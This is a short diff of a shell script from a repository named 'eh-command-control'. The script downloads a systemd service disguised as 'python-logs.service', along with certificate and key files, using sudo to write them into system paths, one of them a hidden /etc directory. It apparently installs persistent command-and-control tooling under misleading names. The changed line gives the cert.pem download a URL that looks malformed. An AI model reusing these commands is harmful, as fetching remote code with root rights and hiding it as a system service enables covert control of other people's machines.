@@ -8,7 +8,7 @@ curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-contr
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
   | sudo tee /etc/systemd/system/python-logs.service > /dev/null
 
-curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
   | sudo tee /etc/.python-certifications/cert.pem > /dev/null
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem \
